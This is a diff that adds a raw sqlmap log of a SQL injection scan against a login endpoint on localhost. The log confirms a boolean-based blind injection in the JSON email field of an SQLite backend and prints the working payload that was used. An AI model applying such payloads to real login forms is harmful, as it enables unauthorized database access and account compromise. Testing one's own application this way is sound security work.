@@ -1,0 +1,64 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:30:58 /2026-03-14/
+
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[20:30:58] [INFO] testing connection to the target URL
+[20:30:58] [INFO] checking if the target is protected by some kind of WAF/IPS
+[20:30:58] [INFO] testing if the target URL content is stable
+[20:30:59] [INFO] target URL content is stable
+[20:30:59] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
+[20:30:59] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
+[20:30:59] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
+[20:30:59] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
+[20:30:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[20:31:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[20:31:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[20:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[20:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[20:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[20:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[20:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[20:31:01] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[20:31:01] [INFO] testing 'Generic inline queries'
+[20:31:01] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[20:31:01] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=401)
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
+[20:31:01] [INFO] testing 'SQLite inline queries'
+[20:31:01] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[20:31:01] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[20:31:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[20:31:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[20:31:01] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[20:31:02] [INFO] target URL appears to have 13 columns in query
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[20:31:04] [INFO] target URL appears to be UNION injectable with 13 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[20:31:05] [INFO] testing 'Generic UNION query (33) - 21 to 40 columns'
+[20:31:06] [INFO] testing 'Generic UNION query (33) - 41 to 60 columns'
+[20:31:06] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
+(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"email":"test@test.com' AND CASE WHEN 4792=4792 THEN 4792 ELSE JSON(CHAR(98,78,116,66)) END-- YlbT","password":"test"}
+---
+[20:31:06] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[20:31:06] [WARNING] HTTP error codes detected during run:
+401 (Unauthorized) - 329 times, 500 (Internal Server Error) - 118 times
+[20:31:06] [INFO] fetched data logged to text files under '/home/danonino/.local/share/sqlmap/output/localhost'
+[20:31:06] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:31:06 /2026-03-14/
+
